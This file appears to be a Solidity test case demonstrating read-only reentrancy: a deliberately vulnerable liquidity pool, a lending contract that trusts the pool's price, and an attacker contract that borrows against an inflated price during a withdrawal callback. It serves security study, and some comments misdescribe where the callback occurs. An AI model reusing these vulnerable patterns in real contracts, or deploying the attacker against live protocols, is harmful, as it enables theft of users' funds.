// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title VulnerablePool - Test case for read-only reentrancy
/// @notice Vulnerability inspired by Balancer/Curve 2023 incidents
/// @dev The vulnerability: view functions return inconsistent state during liquidity changes
contract VulnerablePool {
    // Pool state
    uint256 public totalLiquidity;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    
    // Token balances (simplified - in reality would be ERC20)
    mapping(address => uint256) public balances;
    
    // VULNERABILITY: This callback enables read-only reentrancy
    address public constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    
    event LiquidityAdded(address indexed provider, uint256 amount, uint256 sharesMinted);
    event LiquidityRemoved(address indexed provider, uint256 amount, uint256 sharesBurned);
    
    /// @notice Add liquidity to the pool
    /// @dev VULNERABLE: Callback occurs before state is finalized
    function addLiquidity() external payable {
        require(msg.value > 0, "Zero amount");
        
        uint256 sharesToMint;
        if (totalShares == 0) {
            sharesToMint = msg.value;
        } else {
            sharesToMint = (msg.value * totalShares) / totalLiquidity;
        }
        
        // VULNERABILITY: State update happens AFTER callback
        // During the callback, getPrice() returns stale state
        shares[msg.sender] += sharesToMint;
        totalShares += sharesToMint;
        
        // This is where read-only reentrancy happens:
        // If msg.sender is a contract, it can call getPrice() here
        // and get a price based on the OLD totalLiquidity
        // but with the NEW shares (or vice versa)
        
        totalLiquidity += msg.value;
        
        emit LiquidityAdded(msg.sender, msg.value, sharesToMint);
    }
    
    /// @notice Remove liquidity from the pool
    /// @dev VULNERABLE: Same callback issue during removal
    function removeLiquidity(uint256 sharesToBurn) external {
        require(shares[msg.sender] >= sharesToBurn, "Insufficient shares");
        
        uint256 amount = (sharesToBurn * totalLiquidity) / totalShares;
        
        // State update
        shares[msg.sender] -= sharesToBurn;
        totalShares -= sharesToBurn;
        
        // VULNERABILITY: Callback before totalLiquidity update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        totalLiquidity -= amount;
        
        emit LiquidityRemoved(msg.sender, amount, sharesToBurn);
    }
    
    /// @notice Get the current price per share
    /// @dev VULNERABLE: Returns inconsistent state during addLiquidity/removeLiquidity
    /// @return price Price per share in wei
    function getPrice() external view returns (uint256 price) {
        if (totalShares == 0) return 0;
        // This calculation is vulnerable during state transitions
        price = (totalLiquidity * 1e18) / totalShares;
    }
    
    /// @notice Get the total value locked
    function getTVL() external view returns (uint256) {
        return totalLiquidity;
    }
    
    /// @notice Get user's share of the pool
    function getShareValue(address user) external view returns (uint256) {
        if (totalShares == 0) return 0;
        return (shares[user] * totalLiquidity) / totalShares;
    }
    
    // Allow pool to receive ETH
    receive() external payable {}
}

/// @title VulnerableLending - Lending protocol that uses the vulnerable pool's price
/// @notice This contract reads from VulnerablePool.getPrice() which can be manipulated
contract VulnerableLending {
    VulnerablePool public pool;
    
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;
    mapping(address => uint256) public collateral; // in pool shares
    
    uint256 public constant COLLATERAL_FACTOR = 150; // 150%
    
    event Deposit(address indexed user, uint256 amount);
    event Borrow(address indexed user, uint256 amount);
    event Liquidation(address indexed user, uint256 amount);
    
    constructor(address payable _pool) {
        pool = VulnerablePool(_pool);
    }
    
    /// @notice Deposit ETH as collateral (in pool shares)
    function deposit() external payable {
        // Convert ETH to pool shares
        uint256 price = pool.getPrice();
        require(price > 0, "Pool not initialized");
        
        uint256 sharesAmount = (msg.value * 1e18) / price;
        collateral[msg.sender] += sharesAmount;
        deposits[msg.sender] += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    /// @notice Borrow ETH against collateral
    /// @dev VULNERABLE: Uses pool.getPrice() which can be manipulated via read-only reentrancy
    function borrow(uint256 amount) external {
        uint256 collateralValue = _getCollateralValue(msg.sender);
        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_FACTOR;
        
        require(borrows[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        
        borrows[msg.sender] += amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Borrow(msg.sender, amount);
    }
    
    /// @notice Liquidate undercollateralized position
    /// @dev VULNERABLE: Can be triggered by oracle manipulation
    function liquidate(address user) external {
        uint256 collateralValue = _getCollateralValue(user);
        uint256 debt = borrows[user];
        
        require(debt > 0, "No debt");
        require(collateralValue < debt, "Position healthy");
        
        // Seize collateral
        uint256 seized = collateral[user];
        collateral[user] = 0;
        borrows[user] = 0;
        deposits[user] = 0;
        
        // Transfer to liquidator (simplified)
        uint256 price = pool.getPrice();
        uint256 ethValue = (seized * price) / 1e18;
        
        (bool success, ) = msg.sender.call{value: ethValue}("");
        require(success, "Transfer failed");
        
        emit Liquidation(user, ethValue);
    }
    
    /// @notice Get collateral value using VULNERABLE price oracle
    function _getCollateralValue(address user) internal view returns (uint256) {
        uint256 price = pool.getPrice(); // VULNERABLE!
        return (collateral[user] * price) / 1e18;
    }
    
    /// @notice Get health factor
    function getHealthFactor(address user) external view returns (uint256) {
        if (borrows[user] == 0) return type(uint256).max;
        uint256 collateralValue = _getCollateralValue(user);
        return (collateralValue * 100) / borrows[user];
    }
    
    receive() external payable {}
}

/// @title ReadOnlyReentrancyAttacker - Demonstrates the attack
contract ReadOnlyReentrancyAttacker {
    VulnerablePool public pool;
    VulnerableLending public lending;
    
    bool private _attacking;
    uint256 private _attackStep;
    
    constructor(address payable _pool, address payable _lending) {
        pool = VulnerablePool(_pool);
        lending = VulnerableLending(_lending);
    }
    
    /// @notice Execute the read-only reentrancy attack
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        
        // Step 1: Add initial liquidity to establish price
        pool.addLiquidity{value: msg.value / 2}();
        
        // Step 2: Deposit as collateral at current (fair) price
        lending.deposit{value: msg.value / 4}();
        
        // Step 3: Trigger read-only reentrancy
        // When we remove liquidity, the callback will call getPrice()
        // at an inconsistent state (during the state transition)
        _attacking = true;
        _attackStep = 0;
        
        // Remove liquidity - this triggers the vulnerability
        uint256 shares = pool.shares(address(this));
        if (shares > 0) {
            pool.removeLiquidity(shares / 2);
        }
        
        _attacking = false;
    }
    
    /// @notice Callback during ETH transfer
    receive() external payable {
        if (_attacking && address(pool).balance > 0) {
            _attackStep++;
            
            if (_attackStep == 1) {
                // During removeLiquidity callback:
                // - Our shares are already reduced
                // - But totalLiquidity is not yet reduced
                // - So getPrice() returns an inflated price
                
                // Borrow against inflated collateral value
                uint256 borrowAmount = address(lending).balance / 4;
                if (borrowAmount > 0) {
                    lending.borrow(borrowAmount);
                }
            }
        }
    }
    
    /// @notice Get attacker's profit
    function getProfit() external view returns (uint256) {
        return address(this).balance;
    }
}
